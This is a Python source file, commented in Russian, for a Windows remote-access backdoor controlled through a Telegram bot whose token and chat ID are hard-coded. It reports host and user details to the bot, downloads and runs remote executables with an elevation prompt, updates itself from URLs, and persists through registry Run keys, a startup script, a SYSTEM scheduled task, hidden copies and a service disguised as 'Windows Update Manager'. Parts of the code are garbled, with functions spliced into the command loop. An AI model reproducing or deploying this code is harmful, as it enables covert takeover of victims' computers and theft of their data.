import os
import sys
import json
import time
import ctypes
import socket
import random
import string
import urllib
import platform
import threading
import subprocess
import psutil
import uuid
import shutil
import tempfile
import requests
import winreg
import logging
from datetime import datetime
from typing import Dict, List, Optional, Union, Any, Tuple

# Функция для проверки, предназначена ли команда для этого экземпляра
def is_command_for_this_instance(command: str, instance_id: str) -> bool:
    """Проверяет, предназначена ли команда для этого экземпляра.
    
    Args:
        command (str): Команда пользователя
        instance_id (str): ID текущего экземпляра
        
    Returns:
        bool: True если команда для этого экземпляра
    """
    try:
        # Разбираем команду на части
        parts = command.strip().split()
        if len(parts) < 2:
            # Команда без ID - для текущего экземпляра
            return True
        
        # Проверяем, является ли второй элемент ID
        target_id = parts[1]
        
        # Если ID совпадает с текущим экземпляром
        if target_id == instance_id:
            return True
        
        # Если ID не совпадает - команда не для этого экземпляра
        return False
        
    except Exception as e:
        logging.error(f"Ошибка при проверке команды: {e}")
        return True  # В случае ошибки обрабатываем команду

# Функция для очистки команды от ID экземпляра
def clean_command(command: str) -> str:
    """Убирает ID экземпляра из команды.
    
    Args:
        command (str): Команда с ID экземпляра
        
    Returns:
        str: Очищенная команда
    """
    try:
        parts = command.strip().split()
        if len(parts) >= 2:
            # Убираем ID экземпляра и возвращаем остальную часть команды
            return ' '.join(parts[2:]) if len(parts) > 2 else ""
        return command
    except Exception as e:
        logging.error(f"Ошибка при очистке команды: {e}")
        return command

# Настройка логирования
log_file = os.path.join(tempfile.gettempdir(), "system_service.log")

# Определяем, запущен ли скрипт как скомпилированный EXE
# Это стандартный способ проверки для PyInstaller
is_frozen = getattr(sys, 'frozen', False)

# Создаем базовый список обработчиков (только файл)
log_handlers = [logging.FileHandler(log_file)]

# Если скрипт не "заморожен" (т.е. это обычный .py файл), 
# добавляем вывод в консоль для удобства отладки.
if not is_frozen:
    log_handlers.append(logging.StreamHandler())

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=log_handlers
)
# -4923513285
# 8031189566:AAHwKCrgC4n_NRhOJBBcUFG40mzZeGUw9lw
# Настройки Telegram бота
BOT_TOKEN = "8341645964:AAGn3EmVxlMSuv_UzbY8C2sn0ooBXbfeUCs"  # Вставьте свой токен бота
CHAT_ID = "1191192590"  # Вставьте свой ID чата

# Константы
SERVICE_NAME = "WindowsUpdateManager"
MARKER_FILE = os.path.join(tempfile.gettempdir(), "winsys_marker.dat")
CHECK_INTERVAL = 300  # 5 минут для проверки watchdog
INTERNET_CHECK_TIMEOUT = 2  # Таймаут для проверки интернета

# Добавляем константы для уникального ID
INSTANCE_ID_FILE = os.path.join(tempfile.gettempdir(), "instance_id.dat")
INSTANCE_NAME_FILE = os.path.join(tempfile.gettempdir(), "instance_name.dat")

# Функция для получения или создания уникального ID экземпляра
def get_or_create_instance_id() -> str:
    """Получает существующий ID экземпляра или создает новый.
    
    Returns:
        str: Уникальный ID экземпляра
    """
    try:
        # Пытаемся прочитать существующий ID
        if os.path.exists(INSTANCE_ID_FILE):
            with open(INSTANCE_ID_FILE, 'r') as f:
                instance_id = f.read().strip()
                if instance_id and len(instance_id) == 32:  # Проверяем валидность
                    logging.info(f"Найден существующий ID экземпляра: {instance_id}")
                    return instance_id
        
        # Создаем новый уникальный ID
        instance_id = uuid.uuid4().hex
        logging.info(f"Создан новый ID экземпляра: {instance_id}")
        
        # Сохраняем ID в файл
        try:
            with open(INSTANCE_ID_FILE, 'w') as f:
                f.write(instance_id)
            logging.info(f"ID экземпляра сохранен в {INSTANCE_ID_FILE}")
        except Exception as e:
            logging.error(f"Ошибка при сохранении ID экземпляра: {e}")
        
        return instance_id
    except Exception as e:
        logging.error(f"Ошибка при получении/создании ID экземпляра: {e}")
        # Возвращаем fallback ID
        return f"fallback_{uuid.uuid4().hex[:16]}"

# Функция для получения или создания имени экземпляра
def get_or_create_instance_name() -> str:
    """Получает существующее имя экземпляра или создает новое.
    
    Returns:
        str: Имя экземпляра
    """
    try:
        # Пытаемся прочитать существующее имя
        if os.path.exists(INSTANCE_NAME_FILE):
            with open(INSTANCE_NAME_FILE, 'r') as f:
                instance_name = f.read().strip()
                if instance_name:
                    logging.info(f"Найден существующий имя экземпляра: {instance_name}")
                    return instance_name
        
        # Создаем новое имя на основе информации о системе
        try:
            hostname = socket.gethostname()
            username = os.getlogin()
            instance_name = f"{hostname}_{username}_{random.randint(1000, 9999)}"
        except:
            instance_name = f"Unknown_{random.randint(10000, 99999)}"
        
        logging.info(f"Создано новое имя экземпляра: {instance_name}")
        
        # Сохраняем имя в файл
        try:
            with open(INSTANCE_NAME_FILE, 'w') as f:
                f.write(instance_name)
            logging.info(f"Имя экземпляра сохранено в {INSTANCE_NAME_FILE}")
        except Exception as e:
            logging.error(f"Ошибка при сохранении имени экземпляра: {e}")
        
        return instance_name
    except Exception as e:
        logging.error(f"Ошибка при получении/создании имени экземпляра: {e}")
        return f"Error_{random.randint(10000, 99999)}"

# Функция для получения информации о системе
def get_system_info() -> Dict[str, Any]:
    """Собирает информацию о системе пользователя.
    
    Returns:
        Dict[str, Any]: Словарь с информацией о системе или сообщение об ошибке
    """
    try:
        logging.info("Сбор информации о системе")
        
        # Получаем ID и имя экземпляра
        instance_id = get_or_create_instance_id()
        instance_name = get_or_create_instance_name()
        
        info = {
            "instance_id": instance_id,
            "instance_name": instance_name,
            "hostname": socket.gethostname(),
            "ip": socket.gethostbyname(socket.gethostname()),
            "os": platform.system(),
            "os_version": platform.version(),
            "username": os.getlogin(),
            "machine": platform.machine(),
            "processor": platform.processor(),
            "ram": f"{round(psutil.virtual_memory().total / (1024.0 ** 3), 2)} GB",
            "mac_address": ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 48, 8)][::-1]),
            "admin": ctypes.windll.shell32.IsUserAnAdmin() if platform.system() == 'Windows' else os.geteuid() == 0,
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        
        # Добавляем информацию о дисках
        try:
            disks = []
            for partition in psutil.disk_partitions():
                try:
                    usage = psutil.disk_usage(partition.mountpoint)
                    disks.append({
                        "device": partition.device,
                        "mountpoint": partition.mountpoint,
                        "fstype": partition.fstype,
                        "total": f"{usage.total / (1024.0 ** 3):.2f} GB",
                        "used": f"{usage.used / (1024.0 ** 3):.2f} GB",
                        "free": f"{usage.free / (1024.0 ** 3):.2f} GB",
                        "percent": f"{usage.percent}%"
                    })
                except Exception:
                    pass
            info["disks"] = disks
        except Exception as disk_error:
            logging.error(f"Ошибка при сборе информации о дисках: {disk_error}")
            
        return info
    except Exception as e:
        logging.error(f"Ошибка при сборе информации о системе: {e}")
        return {"error": str(e)}

# Функция для форматирования информации о системе в красивом виде
def format_system_info(info: Dict[str, Any]) -> str:
    """Форматирует информацию о системе в красивом HTML виде.
    
    Args:
        info (Dict[str, Any]): Словарь с информацией о системе
        
    Returns:
        str: Отформатированная HTML строка
    """
    try:
        # Проверяем наличие ошибки
        if "error" in info:
            return f"❌ <b>Ошибка при получении информации:</b>\n<code>{info["error"]}</code>"
        
        # Форматируем основную информацию
        html = f""" <b>ИНФОРМАЦИЯ О СИСТЕМЕ</b>

 <b>ЭКЗЕМПЛЯР БЭКДОРА</b>
├─ <b>ID:</b> <code>{info.get("instance_id", "N/A")}</code>
├─ <b>Имя:</b> <code>{info.get("instance_name", "N/A")}</code>
└─ <b>Время:</b> {info.get("timestamp", "N/A")}

💻 <b>СИСТЕМА</b>
├─ <b>ОС:</b> {info.get("os", "N/A")} {info.get("os_version", "")}
├─ <b>Архитектура:</b> {info.get("machine", "N/A")}
├─ <b>Процессор:</b> {info.get("processor", "N/A")}
└─ <b>RAM:</b> {info.get("ram", "N/A")}

 <b>СЕТЬ</b>
├─ <b>Hostname:</b> <code>{info.get("hostname", "N/A")}</code>
├─ <b>IP адрес:</b> <code>{info.get("ip", "N/A")}</code>
└─ <b>MAC адрес:</b> <code>{info.get("mac_address", "N/A")}</code>

 <b>ПОЛЬЗОВАТЕЛЬ</b>
├─ <b>Имя:</b> <code>{info.get("username", "N/A")}</code>
└─ <b>Права админа:</b> {"✅ Да" if info.get("admin", False) else "❌ Нет"}"""
        
        # Добавляем информацию о дисках
        if "disks" in info and info["disks"]:
            html += "\n\n💾 <b>ДИСКИ</b>"
            for i, disk in enumerate(info["disks"]):
                if i == len(info["disks"]) - 1:
                    prefix = "└─"
                else:
                    prefix = "├─"
                
                # Определяем цвет для процента использования
                percent = float(disk["percent"].replace("%", ""))
                if percent > 90:
                    percent_color = "🔴"
                elif percent > 70:
                    percent_color = "🟡"
                else:
                    percent_color = "🔵"
                
                html += f"\n{prefix} <b>{disk["device"]}</b> ({disk["fstype"]})"
                html += f"\n    📁 {disk["mountpoint"]}"
                html += f"\n    💿 {disk["total"]} | {disk["used"]} | {disk["free"]}"
                html += f"\n    {percent_color} Использовано: {disk["percent"]}"
        
        # Добавляем статус
        html += f"\n\n✅ <b>СТАТУС:</b> <code>Активен</code>"
        
        return html
        
    except Exception as e:
        logging.error(f"Ошибка при форматировании информации: {e}")
        return f"❌ <b>Ошибка при форматировании:</b>\n<code>{str(e)}</code>"

# Функция для отправки текста в Telegram
def send_text_to_telegram(message: str) -> Dict[str, Any]:
    """Отправляет текстовое сообщение в Telegram чат.
    
    Args:
        message (str): Текст для отправки
        
    Returns:
        Dict[str, Any]: Результат отправки сообщения
    """
    logging.info(f"Отправка сообщения в Telegram (длина: {len(message)} символов)")
    
    # Ограничиваем длину сообщения, чтобы избежать ошибок API
    max_length = 4000
    if len(message) > max_length:
        message = message[:max_length-100] + "\n\n[Сообщение слишком длинное и было обрезано...]"
    
    try:
        # Пробуем отправить через requests
        try:
            url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
            params = {
                'chat_id': CHAT_ID, 
                'text': message,
                'parse_mode': 'HTML'  # Поддержка HTML форматирования
            }
            response = requests.post(url, data=params, timeout=10)
            result = response.json()
            if result.get("ok"):
                logging.info("Сообщение успешно отправлено")
            else:
                logging.error(f"Ошибка при отправке сообщения: {result}")
            return result
        except Exception as e:
            logging.error(f"Ошибка при отправке через requests: {e}")
            
        # Если requests не сработал, пробуем через urllib
        try:
            url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
            data = urllib.parse.urlencode({'chat_id': CHAT_ID, 'text': message}).encode('utf-8')
            req = urllib.request.Request(url, data=data, method='POST')
            with urllib.request.urlopen(req, timeout=10) as response:
                response_data = json.loads(response.read().decode('utf-8'))
                logging.info("Сообщение успешно отправлено через urllib")
                return response_data
        except Exception as e2:
            logging.error(f"Ошибка при отправке через urllib: {e2}")
            return {"ok": False, "error": str(e2)}
            
        return {"ok": False}
    except Exception as e3:
        logging.error(f"Критическая ошибка при отправке сообщения: {e3}")
        return {"ok": False, "error": str(e3)}

# Функция для загрузки и запуска EXE файла с правами администратора
def download_and_run_exe(url: str) -> bool:
    """Загружает и запускает исполняемый файл с правами администратора.
    
    Args:
        url (str): URL для загрузки исполняемого файла
        
    Returns:
        bool: True если файл успешно загружен и запущен, иначе False
    """
    logging.info(f"Загрузка и запуск EXE файла с URL: {url}")
    
    try:
        # Создаем временное имя файла с уникальным идентификатором
        exe_path = os.path.join(os.environ['TEMP'], f"{uuid.uuid4().hex}.exe")
        
        # Загружаем файл с таймаутом
        response = requests.get(url, timeout=60)
        if response.status_code != 200:
            logging.error(f"Ошибка при загрузке файла: HTTP статус {response.status_code}")
            return False
        
        # Сохраняем файл
        with open(exe_path, 'wb') as f:
            f.write(response.content)
        
        logging.info(f"Файл успешно загружен: {exe_path} ({len(response.content)} байт)")
        
        # Запускаем с правами администратора
        if ctypes.windll.shell32.IsUserAnAdmin():
            # Уже запущено с правами администратора
            logging.info("Запуск файла с текущими правами администратора")
            subprocess.Popen(exe_path)
        else:
            # Запускаем с повышением прав
            logging.info("Запрос повышения привилегий для запуска файла")
            ctypes.windll.shell32.ShellExecuteW(None, "runas", exe_path, None, None, 1)
        
        return True
    except requests.exceptions.RequestException as e:
        logging.error(f"Ошибка при загрузке файла: {str(e)}")
        return False
    except (OSError, IOError) as e:
        logging.error(f"Ошибка файловой системы: {str(e)}")
        return False
    except Exception as e:
        logging.error(f"Непредвиденная ошибка при загрузке и запуске файла: {str(e)}")
        return False

# Функция для добавления в автозагрузку (несколько методов для надежности)
def add_to_autostart() -> Dict[str, bool]:
    """Добавляет скрипт в автозагрузку различными методами.
    
    Returns:
        Dict[str, bool]: Словарь с результатами добавления различными методами
    """
    logging.info("Добавление в автозагрузку")
    
    if platform.system() != 'Windows':
        return {"windows": False}
        
    script_path = os.path.abspath(sys.argv[0])
    script_name = os.path.basename(script_path)
    startup_folder = os.path.join(os.environ["APPDATA"], "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
    results = {}
    
    # Метод 1: Реестр HKCU\Run
    try:
        logging.info("Добавление в HKCU\Run")
        key = winreg.HKEY_CURRENT_USER
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
            winreg.SetValueEx(reg_key, 'SystemService', 0, winreg.REG_SZ, sys.executable)
        results["hkcu_run"] = True
        logging.info("Успешно добавлено в HKCU\Run")
    except Exception as e:
        results["hkcu_run"] = False
        logging.error(f"Ошибка при добавлении в HKCU\Run: {e}")
    
    # Метод 2: Реестр HKLM\Run (требует прав администратора)
    if ctypes.windll.shell32.IsUserAnAdmin():
        try:
            logging.info("Добавление в HKLM\Run")
            key = winreg.HKEY_LOCAL_MACHINE
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
                winreg.SetValueEx(reg_key, 'WindowsSystemService', 0, winreg.REG_SZ, sys.executable)
            results["hklm_run"] = True
            logging.info("Успешно добавлено в HKLM\Run")
        except Exception as e:
            results["hklm_run"] = False
            logging.error(f"Ошибка при добавлении в HKLM\Run: {e}")
    else:
        results["hklm_run"] = False
        logging.info("Пропуск добавления в HKLM\Run (нет прав администратора)")
    
    # Метод 3: Папка автозагрузки
    try:
        logging.info("Добавление в папку автозагрузки")
        # Создаем .bat файл в папке автозагрузки с уникальным именем
        bat_path = os.path.join(startup_folder, f"system_service_{random.randint(1000, 9999)}.bat")
        with open(bat_path, "w") as bat_file:
            bat_file.write(f'@echo off\nstart "" "{sys.executable}" "{script_path}"\nexit')
        results["startup_folder"] = True
        logging.info(f"Успешно добавлено в папку автозагрузки: {bat_path}")
    except Exception as e:
        results["startup_folder"] = False
        logging.error(f"Ошибка при добавлении в папку автозагрузки: {e}")
    
    # Метод 4: Планировщик задач (если есть права администратора)
    if ctypes.windll.shell32.IsUserAnAdmin():
        try:
            logging.info("Добавление в планировщик задач")
            # Создаем задачу, которая запускается при входе пользователя
            task_name = "WindowsSystemUpdate"
            process = subprocess.run(
                [
                    "schtasks", "/create", "/tn", task_name, "/tr", 
                    f'"{sys.executable}" "{script_path}"', 
                    "/sc", "onlogon", "/ru", "SYSTEM", "/rl", "HIGHEST", "/f"
                ],
                shell=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            results["task_scheduler"] = process.returncode == 0
            if results["task_scheduler"]:
                logging.info("Успешно добавлено в планировщик задач")
            else:
                logging.error("Ошибка при добавлении в планировщик задач")
        except Exception as e:
            results["task_scheduler"] = False
            logging.error(f"Ошибка при добавлении в планировщик задач: {e}")
    else:
        results["task_scheduler"] = False
        logging.info("Пропуск добавления в планировщик задач (нет прав администратора)")
    
    # Подсчет успешных методов
    success_count = sum(1 for result in results.values() if result)
    logging.info(f"Добавление в автозагрузку завершено. Успешно: {success_count}/{len(results)}")
    
    return results

def clear_pending_updates() -> int:
    """
    Очищает очередь ожидающих сообщений в Telegram и возвращает ID последнего обновления.
    Это предотвращает обработку старых команд при перезапуске.
    """
    logging.info("Очистка очереди ожидающих сообщений...")
    last_update_id = 0
    try:
        # Запрашиваем все обновления с таймаутом в 1 секунду
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates?timeout=1"
        response = requests.get(url, timeout=5 )
        if response.status_code == 200:
            updates = response.json()
            if updates.get("ok") and updates.get("result"):
                # Находим самый большой update_id
                last_update_id = max(update["update_id"] for update in updates["result"])
                logging.info(f"Очередь очищена. Последний ID обновления: {last_update_id}")
    except Exception as e:
        logging.error(f"Ошибка при очистке очереди обновлений: {e}")
    return last_update_id

# Основная функция для прослушивания команд из Telegram
def main_listener() -> None:
    """Основной цикл прослушивания и обработки команд из Telegram."""
    logging.info("Запуск основного цикла прослушивания команд")
    
    # Получаем ID и имя экземпляра
    instance_id = get_or_create_instance_id()
    instance_name = get_or_create_instance_name()
    
    # ВАЖНОЕ ИЗМЕНЕНИЕ: Очищаем очередь и устанавливаем начальный last_update_id
    last_update_id = clear_pending_updates()
    
    reconnect_delay = 60
    max_reconnect_delay = 600
    
    while True:
        try:
            if not check_internet_connection():
                logging.warning(f"Нет интернет-соединения. Повторная попытка через {reconnect_delay} секунд")
                time.sleep(reconnect_delay)
                reconnect_delay = min(reconnect_delay * 1.5, max_reconnect_delay)
                continue
            
            reconnect_delay = 60
            
            # Используем last_update_id, который был установлен после очистки
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates?offset={last_update_id + 1}&timeout=30"
            response = requests.get(url, timeout=35 )
            
            if response.status_code != 200:
                logging.warning(f"Ошибка при получении обновлений: HTTP {response.status_code}")
                time.sleep(5)
                continue
            
            updates = response.json()
            
            if not updates.get("ok", False):
                logging.warning(f"API вернул ошибку: {updates.get('description', 'Неизвестная ошибка')}")
                time.sleep(5)
                continue
            
            for update in updates.get("result", []):
                try:
                    if "message" in update and "from" in update["message"] and "text" in update["message"]:
                        chat_id = update["message"]["chat"]["id"]
                        if str(chat_id) != CHAT_ID:
                            logging.warning(f"Получено сообщение из неизвестного чата: {chat_id}")
                            continue
                            
                        command = update["message"]["text"]
                        username = update["message"]["from"].get("username", "unknown")
                        user_id = update["message"]["from"].get("id", "unknown")
                        
                        logging.info(f"Получена команда: {command} от пользователя {username} (ID: {user_id})")

                        # Проверяем, предназначена ли команда для этого экземпляра
                        if not is_command_for_this_instance(command, instance_id):
                            logging.info(f"Команда {command} не предназначена для этого экземпляра (ID: {instance_id})")
                            continue

                        # Обработка команды /info
                        if command.startswith("/info"):
                            logging.info("Обработка команды /info")
                            info = get_system_info()
                            formatted_info = format_system_info(info)
                            send_text_to_telegram(formatted_info)
                        # Обработка команды /download
                        elif command.startswith("/download"):
                            logging.info("Обработка команды /download")
                            clean_cmd = clean_command(command)
                            if clean_cmd:
                                url = clean_cmd.strip()
                                send_text_to_telegram(f"<b>🔄 Начинаю загрузку файла с URL:</b>\n{url}")
                                if download_and_run_exe(url):
                                    send_text_to_telegram("<b>✅ Файл успешно загружен и запущен.</b>")
                                else:
                                    send_text_to_telegram("<b>❌ Ошибка при загрузке или запуске файла.</b>")
                            else:
                                send_text_to_telegram("<b>❌ URL не указан.</b> Используйте формат: <code>/download [ID] URL</code>")ad [ID] URL</code>")
                        
                        # Функция для самообновления
def self_update(url: str) -> bool:
    """Загружает новую версию скрипта и перезапускает его.
    
    Args:
        url (str): URL для загрузки новой версии скрипта
        
    Returns:
        bool: True если обновление успешно, иначе False
    """
    logging.info(f"Попытка самообновления с URL: {url}")
    try:
        response = requests.get(url, timeout=60)
        if response.status_code != 200:
            logging.error(f"Ошибка при загрузке новой версии: HTTP статус {response.status_code}")
            return False
        
        new_script_path = os.path.abspath(sys.argv[0])
        
        # Сохраняем новую версию
        with open(new_script_path, "wb") as f:
            f.write(response.content)
        
        logging.info("Новая версия скрипта успешно загружена и сохранена.")
        
        # Перезапускаем скрипт
        subprocess.Popen([sys.executable, new_script_path], 
                         creationflags=subprocess.CREATE_NEW_PROCESS_GROUP | subprocess.DETACHED_PROCESS)
        os._exit(0) # Завершаем текущий процесс
        return True # Эта строка не будет достигнута
    except Exception as e:
        logging.error(f"Ошибка при самообновлении: {e}")
        return False

                          # Обработка команды /update
                        elif command.startswith("/update"):
                            logging.info("Обработка команды /update")
                            clean_cmd = clean_command(command)
                            if clean_cmd:
                                url = clean_cmd.strip()
                                send_text_to_telegram("<b>🔄 Начинаю обновление...</b>")
                                if self_update(url):
                                    # Это сообщение не будет отправлено, так как процесс будет перезапущен
                                    send_text_to_telegram("<b>✅ Обновление успешно установлено</b>")
                                else:
                                    send_text_to_telegram("<b>❌ Ошибка при обновлении</b>")
                            else:
                                send_text_to_telegram("<b>❌ URL не указан.</b> Используйте формат: <code>/update [ID] URL</code>") [ID] URL</code>")                       
                        # Функция для создания скрытых копий
def create_persistent_copy() -> str:
    """Создает скрытые копии исполняемого файла в системных директориях.
    
    Returns:
        str: Путь к одной из созданных копий или пустая строка в случае ошибки.
    """
    logging.info("Создание скрытых копий для персистентности.")
    script_path = os.path.abspath(sys.argv[0])
    script_name = os.path.basename(script_path)
    
    # Возможные директории для копирования
    target_dirs = [
        os.path.join(os.environ.get("APPDATA", ""), "Microsoft", "Windows", "Start Menu", "Programs", "Startup"),
        os.path.join(os.environ.get("PROGRAMDATA", ""), "Microsoft", "Windows", "Start Menu", "Programs", "Startup"),
        os.path.join(os.environ.get("TEMP", ""), "SystemFiles"),
        os.path.join(os.environ.get("LOCALAPPDATA", ""), "Microsoft", "WindowsApps"),
    ]
    
    created_copy_path = ""
    for target_dir in target_dirs:
        try:
            if not os.path.exists(target_dir):
                os.makedirs(target_dir, exist_ok=True)
            
            # Создаем уникальное имя файла для копии
            copy_name = f"win_sys_{uuid.uuid4().hex[:8]}.exe" if script_name.endswith(".exe") else f"win_sys_{uuid.uuid4().hex[:8]}.py"
            destination_path = os.path.join(target_dir, copy_name)
            
            shutil.copy2(script_path, destination_path)
            logging.info(f"Копия создана: {destination_path}")
            created_copy_path = destination_path # Сохраняем путь к одной из копий
            
            # Устанавливаем атрибуты скрытого файла для Windows
            if platform.system() == "Windows":
                try:
                    FILE_ATTRIBUTE_HIDDEN = 0x02
                    ctypes.windll.kernel32.SetFileAttributesW(destination_path, FILE_ATTRIBUTE_HIDDEN)
                    logging.info(f"Установлен атрибут скрытого файла для {destination_path}")
                except Exception as attr_e:
                    logging.warning(f"Не удалось установить атрибут скрытого файла для {destination_path}: {attr_e}")
                    
        except Exception as e:
            logging.error(f"Ошибка при создании копии в {target_dir}: {e}")
            
    return created_copy_path

# Функция для создания службы Windows
def create_windows_service() -> bool:
    """Создает и запускает службу Windows для персистентности.
    
    Returns:
        bool: True если служба успешно создана и запущена, иначе False.
    """
    logging.info("Попытка создания службы Windows.")
    if platform.system() != "Windows":
        logging.info("Не Windows система, пропуск создания службы.")
        return False
    
    if not ctypes.windll.shell32.IsUserAnAdmin():
        logging.warning("Нет прав администратора для создания службы Windows.")
        return False
        
    try:
        # Путь к исполняемому файлу скрипта
        script_path = os.path.abspath(sys.argv[0])
        
        # Команда для создания службы
        # binPath должен быть в кавычках, если содержит пробелы
        cmd_create = f"sc create {SERVICE_NAME} binPath=\"{sys.executable} {script_path}\" start= auto DisplayName= \"Windows Update Manager\""
        logging.info(f"Выполнение команды: {cmd_create}")
        result_create = subprocess.run(cmd_create, shell=True, capture_output=True, text=True)
        
        if result_create.returncode == 0 or "[SC] CreateService УСПЕХ" in result_create.stdout:
            logging.info("Служба успешно создана.")
            # Запускаем службу
            cmd_start = f"sc start {SERVICE_NAME}"
            logging.info(f"Выполнение команды: {cmd_start}")
            result_start = subprocess.run(cmd_start, shell=True, capture_output=True, text=True)
            if result_start.returncode == 0 or "[SC] StartService УСПЕХ" in result_start.stdout:
                logging.info("Служба успешно запущена.")
                return True
            else:
                logging.error(f"Ошибка при запуске службы: {result_start.stderr}")
                return False
        else:
            logging.error(f"Ошибка при создании службы: {result_create.stderr}")
            return False
            
    except Exception as e:
        logging.error(f"Критическая ошибка при создании службы Windows: {e}")
        return False

# Функция для удаления всех следов бэкдора
def remove_all_traces() -> List[str]:
    """Удаляет все следы бэкдора из системы.
    
    Returns:
        List[str]: Список сообщений о результатах удаления.
    """
    logging.info("Начало удаления всех следов бэкдора.")
    results = []
    
    # 1. Удаление службы Windows
    if platform.system() == "Windows" and ctypes.windll.shell32.IsUserAnAdmin():
        try:
            logging.info(f"Попытка удаления службы {SERVICE_NAME}.")
            subprocess.run(f"sc stop {SERVICE_NAME}", shell=True, capture_output=True, text=True)
            result = subprocess.run(f"sc delete {SERVICE_NAME}", shell=True, capture_output=True, text=True)
            if result.returncode == 0 or "[SC] DeleteService УСПЕХ" in result.stdout:
                results.append(f"✅ Служба \"{SERVICE_NAME}\" удалена.")
                logging.info(f"Служба \"{SERVICE_NAME}\" удалена.")
            else:
                results.append(f"❌ Ошибка при удалении службы \"{SERVICE_NAME}\": {result.stderr}")
                logging.error(f"Ошибка при удалении службы \"{SERVICE_NAME}\": {result.stderr}")
        except Exception as e:
            results.append(f"❌ Исключение при удалении службы: {e}")
            logging.error(f"Исключение при удалении службы: {e}")
    else:
        results.append("ℹ️ Пропуск удаления службы (не Windows или нет прав админа).")
        
    # 2. Удаление из автозагрузки (реестр HKCU\Run)
    try:
        logging.info("Попытка удаления из HKCU\\Run.")
        key = winreg.HKEY_CURRENT_USER
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
            try:
                winreg.DeleteValue(reg_key, "SystemService")
                results.append("✅ Удалено из HKCU\\Run.")
                logging.info("Удалено из HKCU\\Run.")
            except FileNotFoundError:
                results.append("ℹ️ Запись SystemService не найдена в HKCU\\Run.")
                logging.info("Запись SystemService не найдена в HKCU\\Run.")
        
    except Exception as e:
        results.append(f"❌ Ошибка при удалении из HKCU\\Run: {e}")
        logging.error(f"Ошибка при удалении из HKCU\\Run: {e}")
        
    # 3. Удаление из автозагрузки (реестр HKLM\Run)
    if ctypes.windll.shell32.IsUserAnAdmin():
        try:
            logging.info("Попытка удаления из HKLM\\Run.")
            key = winreg.HKEY_LOCAL_MACHINE
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
                try:
                    winreg.DeleteValue(reg_key, "WindowsSystemService")
                    results.append("✅ Удалено из HKLM\\Run.")
                    logging.info("Удалено из HKLM\\Run.")
                except FileNotFoundError:
                    results.append("ℹ️ Запись WindowsSystemService не найдена в HKLM\\Run.")
                    logging.info("Запись WindowsSystemService не найдена в HKLM\\Run.")
        except Exception as e:
            results.append(f"❌ Ошибка при удалении из HKLM\\Run: {e}")
            logging.error(f"Ошибка при удалении из HKLM\\Run: {e}")
    else:
        results.append("ℹ️ Пропуск удаления из HKLM\\Run (нет прав админа).")
        
    # 4. Удаление из папки автозагрузки
    try:
        logging.info("Попытка удаления из папки автозагрузки.")
        startup_folder = os.path.join(os.environ["APPDATA"], "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
        for file_name in os.listdir(startup_folder):
            if file_name.startswith("system_service_") and file_name.endswith(".bat"):
                file_path = os.path.join(startup_folder, file_name)
                os.remove(file_path)
                results.append(f"✅ Удален файл автозагрузки: {file_name}")
                logging.info(f"Удален файл автозагрузки: {file_name}")
    except Exception as e:
        results.append(f"❌ Ошибка при удалении из папки автозагрузки: {e}")
        logging.error(f"Ошибка при удалении из папки автозагрузки: {e}")
        
    # 5. Удаление из планировщика задач
    if ctypes.windll.shell32.IsUserAnAdmin():
        try:
            logging.info("Попытка удаления из планировщика задач.")
            task_name = "WindowsSystemUpdate"
            process = subprocess.run(
                ["schtasks", "/delete", "/tn", task_name, "/f"],
                shell=True,
                capture_output=True,
                text=True
            )
            if process.returncode == 0 or "УСПЕХ: Запланированная задача" in process.stdout:
                results.append("✅ Удалено из планировщика задач.")
                logging.info("Удалено из планировщика задач.")
            else:
                results.append(f"❌ Ошибка при удалении из планировщика задач: {process.stderr}")
                logging.error(f"Ошибка при удалении из планировщика задач: {process.stderr}")
        except Exception as e:
            results.append(f"❌ Исключение при удалении из планировщика задач: {e}")
            logging.error(f"Исключение при удалении из планировщика задач: {e}")
    else:
        results.append("ℹ️ Пропуск удаления из планировщика задач (нет прав админа).")
        
    # 6. Удаление скрытых копий и временных файлов
    script_path = os.path.abspath(sys.argv[0])
    script_name = os.path.basename(script_path)
    
    # Директории, где могли быть созданы копии
    possible_copy_dirs = [
        os.path.join(os.environ.get("APPDATA", ""), "Microsoft", "Windows", "Start Menu", "Programs", "Startup"),
        os.path.join(os.environ.get("PROGRAMDATA", ""), "Microsoft", "Windows", "Start Menu", "Programs", "Startup"),
        os.path.join(os.environ.get("TEMP", ""), "SystemFiles"),
        os.path.join(os.environ.get("LOCALAPPDATA", ""), "Microsoft", "WindowsApps"),
        tempfile.gettempdir() # Для marker.dat, instance_id.dat, instance_name.dat
    ]
    
    files_to_remove = [
        MARKER_FILE,
        INSTANCE_ID_FILE,
        INSTANCE_NAME_FILE,
        log_file,
        script_path # Сам текущий скрипт
    ]
    
    # Добавляем потенциальные имена копий
    for pcd in possible_copy_dirs:
        if os.path.exists(pcd):
            for f_name in os.listdir(pcd):
                if f_name.startswith("win_sys_") and (f_name.endswith(".exe") or f_name.endswith(".py")):
                    files_to_remove.append(os.path.join(pcd, f_name))
    
    for f_path in list(set(files_to_remove)): # Используем set для уникальности путей
        try:
            if os.path.exists(f_path):
                os.remove(f_path)
                results.append(f"✅ Удален файл: {os.path.basename(f_path)}")
                logging.info(f"Удален файл: {os.path.basename(f_path)}")
        except Exception as e:
            results.append(f"❌ Ошибка при удалении файла {os.path.basename(f_path)}: {e}")
            logging.error(f"Ошибка при удалении файла {os.path.basename(f_path)}: {e}")
            
